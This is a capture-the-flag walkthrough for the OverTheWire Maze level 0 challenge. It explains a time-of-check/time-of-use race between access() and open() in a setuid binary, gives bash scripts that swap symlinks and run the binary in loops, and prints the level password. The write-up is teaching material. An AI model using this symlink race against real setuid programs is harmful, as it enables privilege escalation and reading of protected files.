
---
**Challenge URL:** [Maze Wargame](https://overthewire.org/wargames/)

---

### 🔐 Level Goal:

> The binary for this level attempts to read a file from a hardcoded path and print its content. However, it performs a permission check using `access()` before reading. Our goal is to **bypass this check** and read the actual password file using a **race condition**.

---

### 🧠 Concept Covered:

- ⏱️ **Race condition exploitation**
    
- 🧵 Rapid symbolic link switching
    
- 🧾 Understanding `access()`, `open()` sequence
    
- 📜 Script-based attack automation
    

---

### 🛠️ Exploit Breakdown:

#### 🔍 Binary Analysis (Pseudocode):

```c
int main() {
    char buf[20];
    memset(buf, 0, 20);

    if (access("/tmp/128ecf542a35ac5270a87dc740918404", R_OK) == 0) {
        setresuid(geteuid(), geteuid(), geteuid());
        int fd = open("/tmp/128ecf542a35ac5270a87dc740918404", O_RDONLY);
        if (fd < 0) exit(-1);

        read(fd, buf, 19);
        write(1, buf, 19);
    }
    return 0;
}
```

- The file to read is hardcoded as `/tmp/128ecf542a35ac5270a87dc740918404`
    
- `access()` checks permission — **as the current user (maze0)**
    
- `open()` reads — **as the effective user (maze1)**
    
- Race condition window = **between `access()` and `open()`**
    

---

### 🧪 Strategy

We use two scripts:

- 🧵 One rapidly switches the symlink
    
- 🏃 One runs the vulnerable binary in a loop
    

---

### ⚙️ Exploit Scripts

#### 📜 `race.sh` (symlink swapper)

```bash
#!/bin/bash
while true; do
    ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
    ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
done
```

#### 🏃 `runner.sh` (binary spammer)

```bash
#!/bin/bash
while true; do
    /maze/maze0
done
```

---

### ▶️ Execution Steps

1. Start the symlink switcher:
    
    ```bash
    chmod +x race.sh && ./race.sh
    ```
    
2. In another terminal, start the binary runner:
    
    ```bash
    chmod +x runner.sh && ./runner.sh
    ```
    
3. With some luck, the binary reads from `/etc/maze_pass/maze1` instead of `/maze_pass/maze0`.
    

---

### 🔑 Password for Maze Level 1:

```
hashaachon
```

> If the shell prints garbled content, rerun the scripts — timing is key! 🕰️

---
